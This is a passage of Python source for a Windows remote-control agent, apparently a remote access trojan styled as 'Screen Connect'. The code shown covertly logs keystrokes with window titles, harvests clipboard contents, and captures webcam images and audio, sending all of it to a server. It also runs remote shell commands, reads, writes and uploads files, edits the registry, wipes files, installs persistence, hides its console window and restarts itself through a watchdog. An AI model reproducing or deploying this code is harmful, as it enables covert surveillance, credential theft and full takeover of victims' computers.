        self.running = False

    def _can_alert(self, key: str) -> bool:
        now = time.time()
        last = self._last_alerts.get(key, 0)
        if now - last >= CONFIG["ALERT_COOLDOWN_S"]:
            self._last_alerts[key] = now
            return True
        return False

    def _loop(self):
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=2)
                ram = psutil.virtual_memory().percent
                disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent

                if cpu >= CONFIG["ALERT_CPU_THRESHOLD"] and self._can_alert("cpu"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "cpu", "value": cpu,
                        "threshold": CONFIG["ALERT_CPU_THRESHOLD"],
                        "message": f"CPU usage critical: {cpu:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if ram >= CONFIG["ALERT_RAM_THRESHOLD"] and self._can_alert("ram"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "ram", "value": ram,
                        "threshold": CONFIG["ALERT_RAM_THRESHOLD"],
                        "message": f"RAM usage critical: {ram:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if disk >= CONFIG["ALERT_DISK_THRESHOLD"] and self._can_alert("disk"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "disk", "value": disk,
                        "threshold": CONFIG["ALERT_DISK_THRESHOLD"],
                        "message": f"Disk usage critical: {disk:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
            except Exception as e:
                log.error(f"AlertEngine error: {e}")
            time.sleep(30)


# ════════════════════════════════════════════════════════════════════════════
#  SECURE ERASER
# ════════════════════════════════════════════════════════════════════════════
class SecureEraser:
    @staticmethod
    def wipe_file(path: str, passes: int = 3) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"success": False, "error": "Not a file"}
            size = p.stat().st_size
            with open(p, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            p.unlink()
            return {"success": True, "path": str(p), "passes": passes}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  KEYLOGGER
# ════════════════════════════════════════════════════════════════════════════
class KeyLogger:
    def __init__(self, sio_client):
        self.sio        = sio_client
        self._buf: list = []
        self._lock      = threading.Lock()
        self._listener  = None
        self._flush_t: Optional[threading.Thread] = None
        self.running    = False

    def start(self):
        if not PYNPUT_OK or self.running:
            return
        self.running     = True
        self._listener   = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_t    = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_t.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

    def _on_key(self, key):
        try:
            with self._lock:
                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
                self._buf.append(ch)
        except Exception:
            pass

    def _active_window(self) -> str:
        try:
            hwnd   = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf    = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()
        try:
            self.sio.emit("keylog_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "text":      text,
                "window":    self._active_window(),
                "ts":        datetime.utcnow().isoformat(),
            })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._last   = ""
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if not CLIPBOARD_OK or self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
        while self.running:
            try:
                cur = pyperclip.paste()
                if cur and cur != self._last:
                    self._last = cur
                    self.sio.emit("clipboard_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   cur[:8192],
                        "length":    len(cur),
                        "ts":        datetime.utcnow().isoformat(),
                    })
            except Exception:
                pass
            time.sleep(poll)


# ════════════════════════════════════════════════════════════════════════════
#  WEBCAM CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0, quality: int = 80) -> dict:
        if not CV2_OK:
            return {"error": "OpenCV not available."}
        cap = None
        try:
            cap = cv2.VideoCapture(camera_idx)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} could not be opened."}
            # Read multiple frames to flush buffer
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            if not ret:
                return {"error": "Failed to read frame from camera."}
            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
            if not success:
                return {"error": "Encoding failed."}
            return {
                "success":    True,
                "camera_idx": camera_idx,
                "frame":      base64.b64encode(buf.tobytes()).decode(),
                "w":          frame.shape[1],
                "h":          frame.shape[0],
                "ts":         datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}
        finally:
            if cap:
                cap.release()

    @staticmethod
    def list_cameras() -> list:
        if not CV2_OK:
            return []
        cameras = []
        for i in range(8):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                cameras.append({"index": i, "name": f"Camera {i}", "w": w, "h": h})
                cap.release()
        return cameras


# ════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT
# ════════════════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._t: Optional[threading.Thread] = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                bat = psutil.sensors_battery()
                self.sio.emit("heartbeat", {
                    "device_id":     CONFIG["DEVICE_TOKEN"],
                    "cpu":           psutil.cpu_percent(interval=0),
                    "ram":           psutil.virtual_memory().percent,
                    "disk":          psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
                    "net_mbps":      round(_net_monitor.get_mbps(), 1),
                    "battery_pct":   bat.percent if bat else None,
                    "battery_plug":  bat.power_plugged if bat else None,
                    "ts":            datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
# ════════════════════════════════════════════════════════════════════════════
class ScreenConnectAgent:
    def __init__(self):
        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._stop_flag       = threading.Event()

    def _make_client(self):
        """Create a brand-new socketio.Client on every reconnect."""
        sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
        sys_monitor = SystemMonitor(sio)
        keylogger   = KeyLogger(sio)
        clipboard   = ClipboardMonitor(sio)
        webcam      = WebcamCapture(sio)
        shell       = RemoteShell()
        proc_mgr    = ProcessManager()
        files       = FileBrowser()
        heartbeat   = Heartbeat(sio)
        alerts      = AlertEngine(sio)
        registry    = RegistryManager()
        services    = ServiceManager()
        winmgr      = WindowManager()
        audio       = AudioCapture(sio)
        apps        = InstalledApps()
        eraser      = SecureEraser()

        self._register_events(
            sio, sys_monitor, keylogger, clipboard,
            webcam, shell, proc_mgr, files, heartbeat, alerts,
            registry, services, winmgr, audio, apps, eraser,
        )
        return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts

    def _register_events(
        self, sio, sys_monitor, keylogger, clipboard,
        webcam, shell, proc_mgr, files, heartbeat, alerts,
        registry, services, winmgr, audio, apps, eraser,
    ):
        @sio.event
        def connect():
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
            log.info(f"Connected to {CONFIG['SERVER_URL']}")

            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)

            # HTTP belt-and-suspenders checkin
            try:
                requests.post(
                    CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
                    json={"device_id": CONFIG["DEVICE_TOKEN"], **fp},
                    timeout=10
                )
            except Exception:
                pass

            # Start Advanced Monitor AFTER agent_connect so server has
            # the device in _devices before agent_auth arrives (fixes race condition)
            def _delayed_adv_start():
                time.sleep(2)  # give server 2s to process agent_connect
                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
            threading.Thread(target=_delayed_adv_start, daemon=True, name="adv-starter").start()

            heartbeat.start()
            alerts.start()
            if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()

        @sio.event
        def disconnect():
            log.warning("Disconnected from server.")
            sys_monitor.stop()
            heartbeat.stop()
            alerts.stop()

        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action: {tab}")

            # ── Monitor/stream/mouse — handled by Advanced Monitor engine ──
            if tab == "monitor":
                action = data.get("action", "start")
                if data.get("fps") is not None:
                    CONFIG["STREAM_FPS"] = max(1, min(int(data.get("fps", CONFIG["STREAM_FPS"])), 60))
                if data.get("quality") is not None:
                    CONFIG["STREAM_QUALITY"] = max(25, min(int(data.get("quality", CONFIG["STREAM_QUALITY"])), 95))
                if data.get("monitor") is not None:
                    CONFIG["STREAM_MONITOR"] = max(1, int(data.get("monitor", CONFIG["STREAM_MONITOR"])))
                if action == "start":
                    # FIX: If viewer_count never arrived on the adv socket (race condition),
                    # bump _adv_viewers so the stream loop wakes up immediately.
                    global _adv_viewers
                    if _adv_viewers == 0:
                        _adv_viewers = 1
                        log.info("Monitor start via request_action — forced _adv_viewers=1 (adv socket race fallback)")
                    # Always start screenshot fallback — no-op if adv socket is working
                    _start_screenshot_fallback(sio)
                elif action == "set_mode":
                    CONFIG["STREAM_MODE"] = data.get("mode", CONFIG["STREAM_MODE"])
                    _start_screenshot_fallback(sio)
                elif action == "set_quality":
                    _start_screenshot_fallback(sio)
                elif action == "stop":
                    _fb_stop.set()
            elif tab in ("mouse_event", "scroll_event", "frame_ack"):
                pass  # handled by Advanced Monitor engine

            # ── Mouse control via main-socket fallback ─────────────────────
            elif tab == "mouse_move":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        pyautogui.moveTo(x, y, _pause=False)
                    except Exception as e:
                        log.debug(f"mouse_move error: {e}")

            elif tab == "mouse_click":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        btn = "left" if data.get("button", "left") == "left" else "right"
                        evt_type = data.get("type", "")
                        if evt_type == "mouse_dblclick":
                            pyautogui.doubleClick(x, y, button=btn, _pause=False)
                        elif "down" in data:
                            fn = pyautogui.mouseDown if data.get("down", True) else pyautogui.mouseUp
                            fn(x, y, button=btn, _pause=False)
                        else:
                            pyautogui.click(x, y, button=btn, _pause=False)
                    except Exception as e:
                        log.debug(f"mouse_click error: {e}")

            elif tab == "scroll":
                if PYAUTOGUI_OK:
                    try:
                        x, y = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
                        pyautogui.scroll(int(data.get("delta", 3)), x=x, y=y, _pause=False)
                    except Exception as e:
                        log.debug(f"scroll error: {e}")

            elif tab == "type_text":
                if PYAUTOGUI_OK:
                    try:
                        pyautogui.write(data.get("text", ""), interval=0.01, _pause=False)
                    except Exception as e:
                        log.debug(f"type_text error: {e}")

            # ── Keyboard ───────────────────────────────────────────────────
            elif tab == "key_event":
                if PYAUTOGUI_OK:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    KEY_MAP = {
                        "Enter": "enter", "Return": "enter",
                        "Backspace": "backspace", "Tab": "tab",
                        "Escape": "esc", "Delete": "delete",
                        "Insert": "insert", "Home": "home", "End": "end",
                        "PageUp": "pageup", "PageDown": "pagedown",
                        "ArrowUp": "up", "ArrowDown": "down",
                        "ArrowLeft": "left", "ArrowRight": "right",
                        " ": "space", "Control": "ctrl",
                        "Alt": "alt", "Shift": "shift", "Meta": "win",
                        "CapsLock": "capslock", "NumLock": "numlock",
                        "PrintScreen": "printscreen", "ScrollLock": "scrolllock",
                        "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
                        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
                        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
                    }
                    try:
                        if combo == "ctrl+alt+del":
                            subprocess.Popen(
                                ["powershell", "-Command",
                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        elif ktype in ("down", "press"):
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                hotkey = []
                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
                                if data.get("meta")  and key != "Meta":    hotkey.append("win")
                                hotkey.append(pg)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg, _pause=False)
                        elif ktype == "up":
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                pyautogui.keyUp(pg, _pause=False)
                        elif ktype == "type":
                            # Type a full string
                            pyautogui.write(data.get("text", ""), interval=0.01)
                    except Exception as e:
                        log.warning(f"key_event error: {e}")

            # ── Ping ───────────────────────────────────────────────────────
            elif tab == "ping":
                sio.emit("ping_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "t": data.get("t"),
                    "ts": datetime.utcnow().isoformat(),
                })

            # ── System ─────────────────────────────────────────────────────
            elif tab == "system":
                action = data.get("action", "start")
                if action == "start":
                    sys_monitor.start(interval=data.get("interval", 2))
                else:
                    sys_monitor.stop()

            elif tab == "system_snapshot":
                sio.emit("system_stats_report", sys_monitor.get_snapshot())

            elif tab == "disks":
                sio.emit("disks_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "disks": sys_monitor.get_disk_list(),
                })

            elif tab == "network":
                sio.emit("network_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "interfaces": sys_monitor.get_network_interfaces(),
                })

            # ── Processes ──────────────────────────────────────────────────
            elif tab == "processes":
                procs = proc_mgr.list_processes()
                sio.emit("processes_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "processes": procs,
                    "count": len(procs),
                })

            elif tab == "kill_process":
                sio.emit("kill_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.kill_process(int(data.get("pid", 0))),
                })

            elif tab == "start_process":
                sio.emit("start_process_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.start_process(data.get("command", "")),
                })

            elif tab == "suspend_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "suspend_process",
                    **proc_mgr.suspend_process(int(data.get("pid", 0))),
                })

            elif tab == "resume_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "resume_process",
                    **proc_mgr.resume_process(int(data.get("pid", 0))),
                })

            # ── Shell ──────────────────────────────────────────────────────
            elif tab == "shell":
                result = shell.execute(
                    data.get("command", "echo hello"),
                    shell_type=data.get("shell_type", "cmd"),
                )
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "shell_env":
                sio.emit("shell_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **shell.get_env(),
                })

            # ── Files ──────────────────────────────────────────────────────
            elif tab == "file_list":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.list_directory(data.get("path", "C:\\")),
                })

            elif tab == "file_read":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.read_file(data.get("path", "")),
                })

            elif tab == "file_write":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.write_file(data.get("path", ""), data.get("content", "")),
                })

            elif tab == "file_download":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.download_file(data.get("path", "")),
                })

            elif tab == "file_upload":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.upload_file(data.get("path", ""), data.get("data", "")),
                })

            elif tab == "file_delete":
                sio.emit("file_delete_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.delete_file(data.get("path", "")),
                })

            elif tab == "file_copy":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_copy",
                    **files.copy_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_move":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_move",
                    **files.move_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_mkdir":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_mkdir",
                    **files.create_folder(data.get("path", "")),
                })

            elif tab == "file_rename":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_rename",
                    **files.rename(data.get("old", ""), data.get("new", "")),
                })

            elif tab == "file_search":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.search(data.get("root", "C:\\"), data.get("pattern", "*")),
                })

            elif tab == "drives":
                sio.emit("drives_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "drives": files.list_drives(),
                })

            # ── Webcam ─────────────────────────────────────────────────────
            elif tab == "webcam":
                sio.emit("webcam_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **webcam.capture(data.get("camera", 0), data.get("quality", 80)),
                })

            elif tab == "webcam_list":
                sio.emit("webcam_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cameras": webcam.list_cameras(),
                })

            # ── Clipboard ──────────────────────────────────────────────────
            elif tab == "clipboard_get":
                if CLIPBOARD_OK:
                    sio.emit("clipboard_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content": pyperclip.paste()[:8192],
                        "ts": datetime.utcnow().isoformat(),
                    })

            elif tab == "clipboard_set":
                if CLIPBOARD_OK:
                    pyperclip.copy(data.get("text", ""))
                    sio.emit("clipboard_set_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "success": True,
                    })

            # ── Registry ───────────────────────────────────────────────────
            elif tab == "registry_read":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_read",
                    **registry.read_key(data.get("path", ""), data.get("value", "")),
                })

            elif tab == "registry_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_list",
                    **registry.list_key(data.get("path", "")),
                })

            elif tab == "registry_write":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_write",
                    **registry.write_key(data.get("path", ""), data.get("name", ""),
                                         data.get("data", ""), int(data.get("type", winreg.REG_SZ))),
                })

            elif tab == "registry_delete":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_delete",
                    **registry.delete_value(data.get("path", ""), data.get("name", "")),
                })

            # ── Services ───────────────────────────────────────────────────
            elif tab == "services_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "services_list",
                    "services": services.list_services(),
                })

            elif tab == "service_control":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "service_control",
                    **services.control_service(data.get("name", ""), data.get("cmd", "stop")),
                })

            # ── Windows ────────────────────────────────────────────────────
            elif tab == "windows_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "windows_list",
                    "windows": winmgr.list_windows(),
                })

            elif tab == "window_focus":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_focus",
                    **winmgr.focus_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_close":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_close",
                    **winmgr.close_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_minimize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_minimize",
                    **winmgr.minimize_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_maximize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_maximize",
                    **winmgr.maximize_window(int(data.get("hwnd", 0))),
                })

            # ── Installed Apps ─────────────────────────────────────────────
            elif tab == "installed_apps":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "installed_apps",
                    "apps": apps.list_apps(),
                })

            # ── Audio capture ──────────────────────────────────────────────
            elif tab == "audio_capture":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_capture",
                    **audio.capture_chunk(
                        seconds=float(data.get("seconds", 3.0)),
                        sample_rate=int(data.get("sample_rate", 16000)),
                    ),
                })

            elif tab == "audio_devices":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_devices",
                    "devices": audio.list_devices(),
                })

            # ── Secure erase ───────────────────────────────────────────────
            elif tab == "secure_erase":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "secure_erase",
                    **eraser.wipe_file(data.get("path", ""), int(data.get("passes", 3))),
                })

            # ── Power ──────────────────────────────────────────────────────
            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "lock_screen", "success": True,
                })

            elif tab == "sleep":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "sleep", "success": True,
                })
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "shutdown", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /s /t 10 /c "Screen Connect remote shutdown"')

            elif tab == "restart":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "restart", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /r /t 10 /c "Screen Connect remote restart"')

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "abort_shutdown", "success": True,
                })

            elif tab == "logoff":
                os.system("shutdown /l")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "logoff", "success": True,
                })

            elif tab == "hibernate":
                os.system("shutdown /h")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "hibernate", "success": True,
                })

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            else:
                log.warning(f"Unknown tab: {tab}")

    # ── Main Run Loop ─────────────────────────────────────────────────────
    def run(self):
        log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
        if CONFIG["DEVICE_TOKEN"] == "UNSET-RUN-VIA-SERVER":
            log.warning("="*60)
            log.warning("DEVICE_TOKEN is not set! Run with a real token:")
            log.warning("  python agent_source.py MV-XXXXXX-XXXXXX-XXXXXX")
            log.warning("  or set env var: MVIEW_TOKEN=MV-XXXXXX-XXXXXX-XXXXXX")
            log.warning("="*60)
        install_persistence()
        # Note: start_advanced_monitor() is now called inside the connect() event
        # handler so the main socket registers agent_connect first (race fix)
        time.sleep(CONFIG["STARTUP_DELAY"])

        while not self._stop_flag.is_set():
            sio = sys_monitor = heartbeat = keylogger = clipboard = alerts = None
            try:
                sio, sys_monitor, heartbeat, keylogger, clipboard, alerts = self._make_client()
                log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
                sio.connect(
                    CONFIG["SERVER_URL"],
                    transports=["websocket", "polling"],
                    wait_timeout=20,
                    socketio_path="/socket.io",
                )
                sio.wait()
            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection error: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                for comp in [sys_monitor, heartbeat, keylogger, clipboard, alerts]:
                    try:
                        if comp and hasattr(comp, "stop"):
                            comp.stop()
                    except Exception:
                        pass

            if self._stop_flag.is_set():
                break

            jitter = random.uniform(0, self._reconnect_delay * 0.3)
            delay  = self._reconnect_delay + jitter
            log.info(f"Reconnecting in {delay:.1f}s...")
            time.sleep(delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])

    def stop(self):
        self._stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
#  WATCHDOG — restarts agent thread if it dies
# ════════════════════════════════════════════════════════════════════════════
def _watchdog(agent_thread_ref: list):
    time.sleep(60)
    while True:
        time.sleep(30)
        t = agent_thread_ref[0]
        if t and not t.is_alive():
            log.warning("Watchdog: agent thread died — restarting...")
            try:
                new_agent  = ScreenConnectAgent()
                new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                new_thread.start()
                agent_thread_ref[0] = new_thread
            except Exception as e:
                log.error(f"Watchdog restart failed: {e}")


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Hide console window on Windows
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    agent        = ScreenConnectAgent()
    agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
    agent_ref    = [agent_thread]
    agent_thread.start()

    watchdog_thread = threading.Thread(
        target=_watchdog, args=(agent_ref,), daemon=True, name="sc-watchdog"
    )
    watchdog_thread.start()

    agent_thread.join()
